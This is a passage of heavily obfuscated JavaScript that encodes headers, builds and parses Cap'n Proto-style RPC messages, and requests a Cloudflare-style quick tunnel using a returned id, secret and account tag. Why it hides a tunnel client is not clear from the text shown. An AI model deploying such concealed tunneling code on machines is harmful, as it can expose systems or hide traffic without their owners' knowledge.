        }
        return c;
    }
}
function a0ag(a, b, c) {
    const d1 = a0aX, d = {
            'KlOkZ': function (h, i) {
                return h < i;
            },
            'BDXbQ': function (h, i) {
                return h | i;
            },
            'lgHAG': function (h, i) {
                return h >= i;
            },
            'IJtMk': function (h, i) {
                return h / i;
            }
        }, f = (0x1 << b) - 0x1;
    if (d['KlOkZ'](a, f))
        return Buffer[d1(0x3a5)]([d['BDXbQ'](c, a)]);
    const g = [c | f];
    a -= f;
    while (d[d1(0x200)](a, 0x80)) {
        g[d1(0x4a7)](a & 0x7f | 0x80), a = Math[d1(0x3a3)](d[d1(0x1d5)](a, 0x80));
    }
    return g[d1(0x4a7)](a), Buffer[d1(0x3a5)](g);
}
function a0ah(a) {
    const d2 = a0aX, b = { 'PvcGx': d2(0x66b) }, c = Buffer[d2(0x3a5)](a, b[d2(0x3d4)]);
    return Buffer[d2(0x83f)]([
        a0ag(c['length'], 0x7, 0x0),
        c
    ]);
}
function a0ai(a) {
    const d3 = a0aX, b = {
            'nDrGz': function (d, f) {
                return d === f;
            },
            'GtKdH': ':status',
            'JWCTI': function (d, f) {
                return d === f;
            },
            'BTmmG': d3(0x5eb),
            'CsKrA': d3(0x79c),
            'WNTcw': d3(0x1b3),
            'UgIbL': d3(0x7d7),
            'NNPlw': function (d, f) {
                return d === f;
            },
            'YDEbb': d3(0x16f),
            'wBerz': function (d, f) {
                return d === f;
            },
            'xJulc': function (d, f) {
                return d === f;
            },
            'yejtu': function (d, f) {
                return d === f;
            },
            'oanQS': d3(0x5b9),
            'qEVdA': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[d3(0x421)](d, b[d3(0x6b0)]) && b[d3(0x812)](f, b[d3(0x232)]))
            c[d3(0x4a7)](0x88);
        else {
            if (b['JWCTI'](d, b[d3(0x6b0)]) && f === b['CsKrA'])
                c[d3(0x4a7)](0x89);
            else {
                if (d === b[d3(0x6b0)] && f === b[d3(0x685)])
                    c[d3(0x4a7)](0x8a);
                else {
                    if (b[d3(0x421)](d, b[d3(0x6b0)]) && b[d3(0x421)](f, b['UgIbL']))
                        c[d3(0x4a7)](0x8b);
                    else {
                        if (b[d3(0x421)](d, ':status') && b['NNPlw'](f, b['YDEbb']))
                            c['push'](0x8c);
                        else {
                            if (b['wBerz'](d, b['GtKdH']) && b['wBerz'](f, '404'))
                                c[d3(0x4a7)](0x8d);
                            else
                                b[d3(0x52d)](d, d3(0x402)) && b[d3(0x24f)](f, b[d3(0x45a)]) ? c[d3(0x4a7)](0x8e) : (c['push'](...a0ag(0x0, 0x4, 0x0)), c[d3(0x4a7)](...b['qEVdA'](a0ah, d)), c['push'](...b[d3(0x553)](a0ah, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[d3(0x3a5)](c);
}
class a0aj {
    constructor() {
        const d4 = a0aX;
        this[d4(0x720)] = [];
    }
    [a0aX(0x252)](a) {
        const d5 = a0aX, b = this[d5(0x720)][d5(0x38d)];
        for (let c = 0x0; c < a; c++) {
            this[d5(0x720)][d5(0x4a7)](0x0n);
        }
        return b;
    }
    [a0aX(0x89c)](a, b, c, d) {
        const d6 = a0aX, f = {
                'lUxGq': function (j, k) {
                    return j - k;
                },
                'EdpBe': function (j, k) {
                    return j & k;
                },
                'zjepg': function (j, k) {
                    return j(k);
                },
                'zuObU': function (j, k) {
                    return j | k;
                },
                'nqOLD': function (j, k) {
                    return j(k);
                },
                'TozCE': function (j, k) {
                    return j << k;
                }
            }, g = f[d6(0x6d8)](b, a) - 0x1, h = f[d6(0x6f9)](f['zjepg'](BigInt, g) << 0x2n, 0xfffffffcn), i = f[d6(0x6d9)](f[d6(0x7a2)](BigInt, f[d6(0x6f9)](c, 0xffff)), f[d6(0x383)](BigInt(f[d6(0x6f9)](d, 0xffff)), 0x10n));
        this[d6(0x720)][a] = f[d6(0x6d9)](h, f['TozCE'](i, 0x20n));
    }
    [a0aX(0x379)](a, b, c) {
        const d7 = a0aX, d = {
                'fHVAk': function (g, h) {
                    return g(h);
                },
                'injvC': function (g, h) {
                    return g * h;
                },
                'dZScE': function (g, h) {
                    return g & h;
                },
                'GUQJw': function (g, h) {
                    return g << h;
                },
                'CgUUf': function (g, h) {
                    return g * h;
                }
            }, f = 0xffn << d[d7(0x57e)](BigInt, d[d7(0x7f5)](b, 0x8));
        this[d7(0x720)][a] = d[d7(0x312)](this[d7(0x720)][a], ~f) | d[d7(0x82d)](BigInt(c & 0xff), d[d7(0x57e)](BigInt, d['CgUUf'](b, 0x8)));
    }
    [a0aX(0x5b3)](a, b, c) {
        const d8 = a0aX, d = {
                'ODpdn': function (g, h) {
                    return g << h;
                },
                'RrsuX': function (g, h) {
                    return g(h);
                },
                'CHBde': function (g, h) {
                    return g * h;
                },
                'sOEPk': function (g, h) {
                    return g | h;
                },
                'oYTSZ': function (g, h) {
                    return g & h;
                },
                'dQBBv': function (g, h) {
                    return g << h;
                },
                'VGmXp': function (g, h) {
                    return g(h);
                },
                'KmLvI': function (g, h) {
                    return g(h);
                }
            }, f = d[d8(0x7ac)](0xffffn, d[d8(0x6a4)](BigInt, d[d8(0x816)](b, 0x8)));
        this[d8(0x720)][a] = d['sOEPk'](d['oYTSZ'](this[d8(0x720)][a], ~f), d[d8(0x541)](d['VGmXp'](BigInt, d['oYTSZ'](c, 0xffff)), d[d8(0x839)](BigInt, d[d8(0x816)](b, 0x8))));
    }
    [a0aX(0x777)](a, b, c) {
        const d9 = a0aX, d = {
                'yVvay': function (g, h) {
                    return g * h;
                },
                'WClbz': function (g, h) {
                    return g | h;
                },
                'JwZfq': function (g, h) {
                    return g & h;
                },
                'EjgGU': function (g, h) {
                    return g << h;
                },
                'lYDpY': function (g, h) {
                    return g & h;
                },
                'xSRFG': function (g, h) {
                    return g(h);
                }
            }, f = 0xffffffffn << BigInt(d['yVvay'](b, 0x8));
        this[d9(0x720)][a] = d[d9(0x21b)](d[d9(0x39b)](this[d9(0x720)][a], ~f), d['EjgGU'](BigInt(d[d9(0x5ec)](c, 0xffffffff)), d[d9(0x2eb)](BigInt, d[d9(0x3d2)](b, 0x8))));
    }
    [a0aX(0x211)](a, b) {
        const da = a0aX, c = {
                'nexhk': function (d, f) {
                    return d & f;
                },
                'mIUJk': function (d, f) {
                    return d(f);
                }
            };
        this[da(0x720)][a] = c[da(0x171)](c[da(0x844)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0aX(0x54a)](a, b, c = ![]) {
        const db = a0aX, d = {
                'xjehq': function (m, n) {
                    return m === n;
                },
                'sNHPb': db(0x628),
                'neTCe': db(0x66b),
                'jQtrq': function (m, n) {
                    return m + n;
                },
                'isLQj': function (m, n) {
                    return m / n;
                },
                'NXFAT': function (m, n) {
                    return m < n;
                },
                'bWjus': function (m, n) {
                    return m + n;
                },
                'uXXnc': function (m, n) {
                    return m % n;
                },
                'iZTJo': function (m, n) {
                    return m - n;
                },
                'mZWTh': function (m, n) {
                    return m & n;
                },
                'uuLGk': function (m, n) {
                    return m | n;
                },
                'rYWRo': function (m, n) {
                    return m(n);
                },
                'xJOSZ': function (m, n) {
                    return m | n;
                },
                'cGTjb': function (m, n) {
                    return m << n;
                },
                'cdmBe': function (m, n) {
                    return m & n;
                },
                'KdnJA': function (m, n) {
                    return m | n;
                },
                'rAljz': function (m, n) {
                    return m << n;
                }
            }, f = d[db(0x616)](typeof b, d[db(0x2d7)]) ? Buffer[db(0x3a5)](b, d[db(0x6f1)]) : b, g = d[db(0x606)](f[db(0x38d)], c ? 0x1 : 0x0), h = this[db(0x252)](Math[db(0x376)](d['isLQj'](g, 0x8)));
        for (let m = 0x0; d[db(0x121)](m, f[db(0x38d)]); m++) {
            this[db(0x379)](d[db(0x6d0)](h, Math['floor'](d[db(0x28b)](m, 0x8))), d[db(0x775)](m, 0x8), f[m]);
        }
        const j = d[db(0x190)](d[db(0x190)](h, a), 0x1), k = d['mZWTh'](d[db(0x3f8)](d[db(0x609)](BigInt, j) << 0x2n, 0x1n), 0xffffffffn), l = d[db(0x5a5)](0x2n, d[db(0x715)](d[db(0x609)](BigInt, d[db(0x4fd)](g, 0x1fffffff)), 0x3n));
        this[db(0x720)][a] = d[db(0x285)](k, d[db(0x38b)](l, 0x20n));
    }
    [a0aX(0x303)](a, b) {
        const dc = a0aX, c = {
                'jLTVa': function (g, h) {
                    return g - h;
                },
                'kPnnx': function (g, h) {
                    return g | h;
                },
                'bxFJZ': function (g, h) {
                    return g & h;
                },
                'ydbZc': function (g, h) {
                    return g << h;
                },
                'xMVqZ': function (g, h) {
                    return g | h;
                },
                'fcXyn': function (g, h) {
                    return g(h);
                },
                'bUAOB': function (g, h) {
                    return g + h;
                }
            };
        if (!b['length']) {
            this['words'][a] = 0x0n;
            return;
        }
        const d = this[dc(0x252)](b['length']), f = c['jLTVa'](c[dc(0x820)](d, a), 0x1);
        this[dc(0x720)][a] = c[dc(0x2a4)](c[dc(0x2ef)](c[dc(0x2a4)](c['ydbZc'](BigInt(f), 0x2n), 0x1n), 0xffffffffn), c[dc(0x730)](0x6n, c[dc(0x551)](c[dc(0x3ca)](BigInt, b[dc(0x38d)]), 0x3n)) << 0x20n);
        for (let g = 0x0; g < b[dc(0x38d)]; g++) {
            this[dc(0x54a)](c[dc(0x22e)](d, g), b[g], !![]);
        }
    }
    [a0aX(0x367)]() {
        const dd = a0aX, a = {
                'BBGww': function (d, f) {
                    return d < f;
                },
                'CcZpG': function (d, f) {
                    return d & f;
                },
                'plIHx': function (d, f) {
                    return d * f;
                }
            }, b = Buffer[dd(0x252)](0x8);
        b[dd(0x34b)](0x0, 0x0), b[dd(0x34b)](this[dd(0x720)][dd(0x38d)], 0x4);
        const c = Buffer[dd(0x252)](this[dd(0x720)]['length'] * 0x8);
        for (let d = 0x0; a['BBGww'](d, this[dd(0x720)]['length']); d++) {
            c[dd(0x611)](a[dd(0x6dc)](this[dd(0x720)][d], 0xffffffffffffffffn), a[dd(0x888)](d, 0x8));
        }
        return Buffer[dd(0x83f)]([
            b,
            c
        ]);
    }
}
function a0ak(a) {
    const de = a0aX, b = new a0aj(), c = b[de(0x252)](0x1), d = b[de(0x252)](0x1), f = b['alloc'](0x1);
    b[de(0x89c)](c, d, 0x1, 0x1), b[de(0x5b3)](d, 0x0, 0x8);
    const g = b[de(0x252)](0x1);
    return b[de(0x252)](0x1), b['structPtr'](f, g, 0x1, 0x1), b[de(0x777)](g, 0x0, a), b['finish']();
}
function a0al(a, b, c, d, f, g) {
    const df = a0aX, h = {
            'jzwZa': function (H, I) {
                return H | I;
            },
            'fKfjM': function (H, I) {
                return H & I;
            },
            'XDESx': function (H, I) {
                return H | I;
            },
            'wxhYj': df(0x7ec),
            'plLGa': df(0x6bb),
            'xGXTc': df(0x360),
            'KaOcu': 'Nexus-Python'
        }, i = new a0aj(), j = i[df(0x252)](0x1), k = i['alloc'](0x1), l = i['alloc'](0x1);
    i[df(0x89c)](j, k, 0x1, 0x1), i[df(0x5b3)](k, 0x0, 0x2);
    const m = i[df(0x252)](0x1), n = i[df(0x252)](0x1);
    i['alloc'](0x1);
    const o = i['alloc'](0x1), p = i[df(0x252)](0x1);
    i[df(0x252)](0x1), i['structPtr'](l, m, 0x3, 0x3), i[df(0x777)](m, 0x0, a), i['setU64'](n, 0xf71695ec7fe85497n);
    const q = i[df(0x252)](0x1), r = i[df(0x252)](0x1);
    i[df(0x89c)](o, q, 0x1, 0x1), i['setU16'](q, 0x4, 0x1);
    const s = i[df(0x252)](0x1);
    i[df(0x252)](0x1), i[df(0x89c)](r, s, 0x1, 0x1), i[df(0x777)](s, 0x0, b);
    const t = i['alloc'](0x1);
    i['alloc'](0x1), i[df(0x89c)](p, t, 0x0, 0x2);
    const u = i[df(0x252)](0x1), v = i[df(0x252)](0x1), w = i['alloc'](0x1), x = i[df(0x252)](0x1);
    i[df(0x89c)](t, u, 0x1, 0x3), i[df(0x379)](u, 0x0, g);
    const y = i[df(0x252)](0x1), z = i['alloc'](0x1);
    i[df(0x89c)](v, y, 0x0, 0x2), i['writeBytes'](y, c, !![]), i[df(0x54a)](z, d), i[df(0x54a)](w, f);
    const A = i[df(0x252)](0x1), B = i[df(0x252)](0x1);
    i[df(0x252)](0x1), i[df(0x89c)](x, A, 0x1, 0x2);
    const C = i[df(0x252)](0x1), D = i[df(0x252)](0x1), E = i[df(0x252)](0x1), F = i[df(0x252)](0x1);
    i[df(0x89c)](B, C, 0x0, 0x4);
    const G = a0k['randomBytes'](0x10);
    return G[0x6] = h['jzwZa'](h[df(0x16b)](G[0x6], 0xf), 0x40), G[0x8] = h[df(0x5a3)](h[df(0x16b)](G[0x8], 0x3f), 0x80), i['writeBytes'](C, G), i[df(0x303)](D, [
        h[df(0x400)],
        h[df(0x84d)]
    ]), i[df(0x54a)](E, h[df(0x3da)], !![]), i[df(0x54a)](F, h[df(0x3f5)], !![]), i[df(0x367)]();
}
function a0am(a) {
    const dg = a0aX, b = {
            'YcMbJ': function (f, g) {
                return f >= g;
            },
            'mKTqK': function (f, g) {
                return f + g;
            },
            'HgeAT': function (f, g) {
                return f * g;
            },
            'ZVgFP': function (f, g) {
                return f % g;
            },
            'EOjRk': function (f, g) {
                return f < g;
            },
            'ijsWt': function (f, g) {
                return f * g;
            },
            'Ufunr': function (f, g) {
                return f !== g;
            },
            'KTfZa': dg(0x6b7)
        }, c = [];
    let d = 0x0;
    while (b['YcMbJ'](a[dg(0x38d)] - d, 0x8)) {
        const f = a[dg(0x808)](d), g = a[dg(0x808)](d + 0x4), h = b['mKTqK'](f, 0x1);
        let j = 0x2 + h, k = b[dg(0x54f)](j, 0x4);
        b[dg(0x66d)](k, 0x8) && (k += 0x4);
        if (b[dg(0x687)](a[dg(0x38d)] - d, k))
            break;
        const l = [g];
        for (let n = 0x1; n < h; n++) {
            l[dg(0x4a7)](a[dg(0x808)](b[dg(0x132)](d + 0x4, b[dg(0x575)](n, 0x4))));
        }
        const m = b[dg(0x132)](k, b['HgeAT'](l[dg(0x129)]((o, p) => o + p, 0x0), 0x8));
        if (b[dg(0x687)](a[dg(0x38d)] - d, m))
            break;
        if (b[dg(0x77b)](h, 0x1))
            throw new Error(b['KTfZa']);
        c[dg(0x4a7)](a[dg(0x6aa)](b[dg(0x132)](d, k), b['mKTqK'](d, m))), d += m;
    }
    return [
        c,
        a[dg(0x6aa)](d)
    ];
}
function a0an(a, b) {
    const dh = a0aX, c = {
            'oTsfD': function (j, k) {
                return j >= k;
            },
            'cPpqA': dh(0x506),
            'LVUSR': function (j, k) {
                return j !== k;
            },
            'BQBqw': function (j, k) {
                return j & k;
            },
            'TnBAc': dh(0x71b),
            'aJHsb': function (j, k) {
                return j & k;
            },
            'OomEv': function (j, k) {
                return j + k;
            },
            'JZuPp': function (j, k) {
                return j(k);
            },
            'QAdoF': function (j, k) {
                return j & k;
            },
            'SFnmD': function (j, k) {
                return j >> k;
            },
            'xekGu': function (j, k) {
                return j(k);
            },
            'ICnWJ': function (j, k) {
                return j >> k;
            },
            'PpymQ': function (j, k) {
                return j < k;
            },
            'QCszu': function (j, k) {
                return j > k;
            },
            'meSXB': function (j, k) {
                return j + k;
            }
        };
    if (c[dh(0x73c)](b, a[dh(0x38d)]))
        throw new Error(c[dh(0x11f)]);
    const d = a[b];
    if (c[dh(0x640)](c[dh(0x47b)](d, 0x3n), 0x0n))
        throw new Error(c[dh(0x1fd)]);
    let f = c['BQBqw'](d >> 0x2n, 0x3fffffffn);
    c[dh(0x5bc)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dh(0x324)](b + 0x1, Number(f)), h = c[dh(0x48a)](Number, c[dh(0x73a)](c[dh(0x2cf)](d, 0x20n), 0xffffn)), i = c[dh(0x39c)](Number, c[dh(0x642)](d, 0x30n) & 0xffffn);
    if (c[dh(0x533)](g, 0x0) || c[dh(0x600)](c['meSXB'](g + h, i), a['length']))
        throw new Error(c['cPpqA']);
    return [
        g,
        h,
        i
    ];
}
function a0ao(a, b) {
    const di = a0aX, c = {
            'bOCzB': function (m, n) {
                return m & n;
            },
            'vCECX': function (m, n) {
                return m >> n;
            },
            'fRvJA': function (m, n) {
                return m + n;
            },
            'SNYMv': function (m, n) {
                return m(n);
            },
            'ididC': function (m, n) {
                return m(n);
            },
            'sAWCq': function (m, n) {
                return m(n);
            },
            'CXUvL': function (m, n) {
                return m >> n;
            },
            'mKjMG': function (m, n) {
                return m / n;
            },
            'NeFBl': function (m, n) {
                return m !== n;
            },
            'ndZDF': function (m, n) {
                return m > n;
            },
            'JMREy': function (m, n) {
                return m + n;
            },
            'yKNmK': function (m, n) {
                return m < n;
            },
            'HagrN': function (m, n) {
                return m & n;
            },
            'gvTIE': function (m, n) {
                return m * n;
            },
            'zOGPa': 'utf8'
        };
    if (b >= a[di(0x38d)])
        return '';
    const d = a[b];
    if ((d & 0x3n) !== 0x1n)
        return '';
    let f = c[di(0x899)](c[di(0x67a)](d, 0x2n), 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[di(0x3f1)](b, 0x1) + c[di(0x5d9)](Number, f), h = c['ididC'](Number, c[di(0x899)](d >> 0x20n, 0x7n)), j = c[di(0x6e0)](Number, c[di(0x482)](d, 0x23n)), k = Math['ceil'](c[di(0x45f)](j, 0x8));
    if (c[di(0x44b)](h, 0x2) || g < 0x0 || c['ndZDF'](c[di(0x71d)](g, k), a[di(0x38d)]))
        return '';
    const l = Buffer[di(0x252)](k * 0x8);
    for (let m = 0x0; c[di(0x375)](m, k); m++) {
        l[di(0x611)](c[di(0x69d)](a[g + m], 0xffffffffffffffffn), c[di(0x5fc)](m, 0x8));
    }
    return l[di(0x6aa)](0x0, j)[di(0x562)](c[di(0x713)])[di(0x884)](/\0+$/, '');
}
function a0ap(a) {
    const dj = a0aX, b = {
            'mHTDX': function (z, A) {
                return z % A;
            },
            'OtCaA': function (z, A) {
                return z < A;
            },
            'SWMjR': dj(0x1a3),
            'whVVb': function (z, A) {
                return z < A;
            },
            'vbQJT': function (z, A) {
                return z / A;
            },
            'WhggI': function (z, A) {
                return z * A;
            },
            'FFerO': function (y, z, A) {
                return y(z, A);
            },
            'PhTyj': function (z, A) {
                return z !== A;
            },
            'sGmiW': function (z, A) {
                return z & A;
            },
            'vUpMr': dj(0x69b),
            'TuQrI': function (z, A) {
                return z + A;
            },
            'KixIu': function (y, z) {
                return y(z);
            },
            'GyRlR': function (z, A) {
                return z & A;
            },
            'QSJrk': function (z, A) {
                return z >> A;
            },
            'WEWol': function (z, A) {
                return z === A;
            },
            'fSYKS': function (y, z, A) {
                return y(z, A);
            },
            'jmFYK': function (z, A) {
                return z !== A;
            },
            'gfugm': function (z, A) {
                return z + A;
            },
            'Rxtsu': 'RPC\x20return\x20union\x20',
            'cFjgW': function (z, A) {
                return z + A;
            },
            'GhsRV': function (z, A) {
                return z + A;
            },
            'dHyPY': function (y, z) {
                return y(z);
            },
            'kvWYR': function (y, z, A) {
                return y(z, A);
            }
        };
    if (b['mHTDX'](a[dj(0x38d)], 0x8) || b[dj(0x6b6)](a[dj(0x38d)], 0x18))
        throw new Error(b[dj(0x3a0)]);
    const c = [];
    for (let y = 0x0; b[dj(0x565)](y, b[dj(0x72c)](a[dj(0x38d)], 0x8)); y++) {
        c[dj(0x4a7)](a[dj(0x110)](b[dj(0x216)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b['FFerO'](a0an, c, 0x0);
    if (b[dj(0x565)](f, 0x1) || b[dj(0x89b)](b[dj(0x84f)](c[d], 0xffffn), 0x3n))
        throw new Error(b[dj(0x279)]);
    let h, j, k;
    [h, j, k] = a0an(c, b[dj(0x46a)](d, f));
    const l = b[dj(0x386)](Number, b[dj(0x2d0)](b['QSJrk'](c[h], 0x30n), 0xffffn));
    if (b['WEWol'](l, 0x1))
        return {
            'ok': ![],
            'error': b['fSYKS'](a0ao, c, b['TuQrI'](h, j))
        };
    if (b['jmFYK'](l, 0x0))
        return {
            'ok': ![],
            'error': b[dj(0x308)](b['Rxtsu'], l)
        };
    let m, n, o;
    [m, n, o] = b[dj(0x5e2)](a0an, c, b[dj(0x590)](h, j));
    let p, q, r;
    [p, q, r] = b[dj(0x5e2)](a0an, c, b['GhsRV'](m, n));
    const s = c[p], t = b['dHyPY'](Number, s & 0xffffn);
    if (b[dj(0x480)](t, 0x0))
        return {
            'ok': ![],
            'error': b[dj(0x5e2)](a0ao, c, b[dj(0x46a)](p, q))
        };
    if (b[dj(0x89b)](t, 0x1))
        return {
            'ok': ![],
            'error': dj(0x1da) + t
        };
    let u, v, w;
    [u, v, w] = b['kvWYR'](a0an, c, b[dj(0x308)](p, q));
    const x = a0ao(c, b[dj(0x6fb)](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b[dj(0x6ad)](Boolean, b[dj(0x2d0)](c[u], 0x1n))
    };
}
const a0aq = {
    '.js': a0aX(0x895),
    '.mjs': 'text/javascript;\x20charset=utf-8',
    '.css': 'text/css;\x20charset=utf-8',
    '.json': a0aX(0x142),
    '.map': a0aX(0x142),
    '.wasm': 'application/wasm',
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': a0aX(0x2f2),
    '.svg': a0aX(0x6dd),
    '.xml': a0aX(0x4b6),
    '.woff': 'font/woff2',
    '.woff2': 'font/woff2',
    '.png': a0aX(0x3b1),
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': a0aX(0x40c),
    '.ico': 'image/x-icon'
};
function a0ar(a) {
    const dk = a0aX, b = {
            'ecxWO': function (f, g) {
                return f < g;
            }
        }, c = a['endsWith']('/') ? a[dk(0x6fd)](0x0, -0x1) : a, d = c['lastIndexOf']('.');
    if (b[dk(0x704)](d, 0x0))
        return '';
    return a0aq[c[dk(0x6fd)](d)['toLowerCase']()] || '';
}
function a0as(a) {
    const dl = a0aX, b = {
            'HyHHc': dl(0x628),
            'vyhDV': dl(0x373),
            'fnYDG': function (c, d) {
                return c + d;
            },
            'AZlMT': function (c, d) {
                return c % d;
            }
        };
    if (Array[dl(0x7cd)](a))
        return Buffer[dl(0x3a5)](a);
    if (typeof a !== b[dl(0x7ce)])
        throw new Error(b[dl(0x717)]);
    return Buffer[dl(0x3a5)](b[dl(0x3e0)](a, '='[dl(0x490)](b[dl(0x1f4)](-a[dl(0x38d)], 0x4))), dl(0x71a));
}
const a0at = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0au(a) {
    const dm = a0aX, b = {
            'LMVTB': dm(0x138),
            'YqQOQ': dm(0x2ca),
            'TraKN': dm(0x66b),
            'RVrOQ': function (c, d) {
                return c + d;
            },
            'ukdSO': function (c, d) {
                return c + d;
            },
            'Vxmso': dm(0x42e),
            'oDDSK': dm(0x6a8),
            'YpvPv': function (c, d) {
                return c(d);
            },
            'FtdGX': function (c, d) {
                return c !== d;
            },
            'HfDpN': dm(0x628),
            'EPUXi': dm(0x494),
            'wlgAC': dm(0x49a),
            'OGTOO': dm(0x6b4),
            'dbplV': dm(0x30a),
            'nIdoB': function (c, d) {
                return c(d);
            },
            'Xghcy': function (c, d) {
                return c + d;
            },
            'LbnRd': 'requesting\x20quick\x20tunnel\x20failed:\x20',
            'GEFNt': function (c, d) {
                return c === d;
            },
            'HhfDO': 'https:',
            'obsEl': dm(0x2ec),
            'qocmj': dm(0x536),
            'FGLfz': 'cftunnel.js/1.0'
        };
    return new Promise((c, d) => {
        const dn = dm, f = {
                'hveyw': b[dn(0x332)],
                'BmxXf': function (j, k) {
                    return j(k);
                },
                'HXjfa': function (j, k) {
                    const dp = dn;
                    return b[dp(0x33e)](j, k);
                },
                'aqqjk': function (j, k) {
                    const dq = dn;
                    return b[dq(0x86b)](j, k);
                },
                'gKYpk': function (j, k) {
                    const dr = dn;
                    return b[dr(0x33e)](j, k);
                },
                'lCban': b[dn(0x85c)],
                'tleRM': function (j, k) {
                    return j(k);
                },
                'KdPWf': function (j, k) {
                    return j + k;
                },
                'wiJDM': b[dn(0x16c)],
                'sQqZY': function (j, k) {
                    const ds = dn;
                    return b[ds(0x763)](j, k);
                },
                'gUIqc': dn(0x6ca),
                'zaxAC': function (j, k) {
                    const dt = dn;
                    return b[dt(0x7b1)](j, k);
                },
                'GpaGm': b[dn(0x877)],
                'DmwUu': b['EPUXi'],
                'ytldQ': b[dn(0x549)],
                'ywnWL': function (j, k) {
                    return j(k);
                },
                'JiYxY': b['OGTOO']
            };
        let g;
        try {
            g = new URL(b['RVrOQ'](a['replace'](/\/+$/, ''), b[dn(0x3ab)]));
        } catch (j) {
            b[dn(0x526)](d, new Error(b[dn(0x2c2)](b['LbnRd'], j[dn(0x56d)])));
            return;
        }
        const h = b[dn(0x7e7)](g[dn(0x112)], b[dn(0x755)]) ? a0h : a0g, i = h[dn(0x2c5)](g, {
                'method': b[dn(0x36b)],
                'headers': {
                    'Content-Type': b[dn(0x455)],
                    'User-Agent': b[dn(0x38f)]
                },
                'timeout': 0x3a98
            }, k => {
                const du = dn, l = [];
                k['on'](b['LMVTB'], m => l[du(0x4a7)](m)), k['on'](b[du(0x804)], d), k['on'](du(0x712), () => {
                    const dv = du, m = Buffer[dv(0x83f)](l), n = k[dv(0x608)];
                    let o;
                    try {
                        o = JSON[dv(0x1ef)](m['toString'](f[dv(0x414)]));
                    } catch (q) {
                        f[dv(0x866)](d, new Error(f[dv(0x162)](f[dv(0x537)](f[dv(0x78a)](f[dv(0x5f5)], n), dv(0x147)), m['subarray'](0x0, 0x12c)[dv(0x562)](dv(0x66b)))));
                        return;
                    }
                    const p = o[dv(0x395)] || {};
                    if (!(o[dv(0x31b)] ?? !![]) || !p) {
                        f['tleRM'](d, new Error(f[dv(0x59e)](f[dv(0x74b)], JSON['stringify'](o[dv(0x50c)]))));
                        return;
                    }
                    try {
                        const r = f[dv(0x184)](String, p['id']);
                        if (!a0at[dv(0x328)](r))
                            throw new Error(f[dv(0x364)]);
                        if (f[dv(0x85e)](typeof p[dv(0x639)], dv(0x628)) || f[dv(0x85e)](typeof p[dv(0x53c)], f[dv(0x83d)]))
                            throw new Error(f[dv(0x7b3)]);
                        const s = f[dv(0x184)](a0as, p['secret']), t = Buffer[dv(0x3a5)](r[dv(0x884)](/-/g, ''), f[dv(0x377)]);
                        f[dv(0x4aa)](c, [
                            p[dv(0x53c)],
                            p['account_tag'],
                            s,
                            t
                        ]);
                    } catch (u) {
                        f['BmxXf'](d, new Error(f[dv(0x1a6)] + u[dv(0x56d)]));
                    }
                });
            });
        i['on'](b['YqQOQ'], k => d(new Error(dn(0x51d) + k['message']))), i['end']();
    });
}
function a0av(a) {
    const dw = a0aX;
    return a['map'](([b, c]) => Buffer[dw(0x3a5)](b, dw(0x66b))['toString'](dw(0x71a))[dw(0x884)](/=+$/, '') + ':' + Buffer[dw(0x3a5)](c, dw(0x66b))['toString']('base64')[dw(0x884)](/=+$/, ''))[dw(0x344)](';');
}
class a0aw {
    constructor(a) {
        const dx = a0aX, b = {
                'ecXvn': dx(0x2a0),
                'aIJiU': dx(0x5a2),
                'wqESE': 'error',
                'GUuuJ': dx(0x138)
            }, c = b[dx(0x420)]['split']('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['buffer'] = Buffer[dx(0x252)](0x0);
                continue;
            case '1':
                a['on'](b[dx(0x61a)], () => {
                    const dy = dx;
                    this[dy(0x3ea)] = !![], this[dy(0x4b8)]();
                });
                continue;
            case '2':
                this['closed'] = ![];
                continue;
            case '3':
                a['on'](dx(0x712), () => {
                    const dz = dx;
                    this[dz(0x3ea)] = !![], this[dz(0x4b8)]();
                });
                continue;
            case '4':
                this['socket'] = a;
                continue;
            case '5':
                a['on'](b['wqESE'], f => {
                    const dA = dx;
                    this['errored'] = f, this[dA(0x4b8)]();
                });
                continue;
            case '6':
                this[dx(0x12b)] = null;
                continue;
            case '7':
                this[dx(0x700)] = [];
                continue;
            case '8':
                a['on'](b['GUuuJ'], f => {
                    const dB = dx;
                    this[dB(0x767)] = this[dB(0x767)][dB(0x38d)] ? Buffer[dB(0x83f)]([
                        this[dB(0x767)],
                        f
                    ]) : f, this[dB(0x4b8)]();
                });
                continue;
            }
            break;
        }
    }
    ['_drain']() {
        const dC = a0aX, a = {
                'patDo': function (b, c) {
                    return b > c;
                },
                'AJlKR': function (b, c) {
                    return b >= c;
                },
                'SFnHT': function (b, c) {
                    return b !== c;
                }
            };
        while (a['patDo'](this['waiters'][dC(0x38d)], 0x0)) {
            const b = this[dC(0x700)][0x0];
            if (a[dC(0x8a9)](this[dC(0x767)][dC(0x38d)], b[dC(0x1a4)])) {
                this[dC(0x700)][dC(0x513)]();
                const c = this[dC(0x767)][dC(0x6aa)](0x0, b['need']);
                this['buffer'] = this[dC(0x767)][dC(0x6aa)](b['need']), b[dC(0x409)](c);
            } else {
                if (a['SFnHT'](this[dC(0x12b)], null))
                    this['waiters'][dC(0x513)](), b[dC(0x4e2)](this['errored']);
                else {
                    if (this['closed'])
                        this[dC(0x700)]['shift'](), b[dC(0x4e2)](new Error(dC(0x374)));
                    else
                        break;
                }
            }
        }
    }
    ['readExact'](a) {
        const dD = a0aX, b = {
                'JyWFL': function (c, d) {
                    return c !== d;
                },
                'ebUoy': function (c, d) {
                    return c >= d;
                },
                'NBiaC': dD(0x374)
            };
        if (b[dD(0x81a)](this[dD(0x12b)], null))
            return Promise[dD(0x4e2)](this['errored']);
        if (b[dD(0x62d)](this['buffer'][dD(0x38d)], a)) {
            const c = this[dD(0x767)][dD(0x6aa)](0x0, a);
            return this[dD(0x767)] = this['buffer'][dD(0x6aa)](a), Promise[dD(0x409)](c);
        }
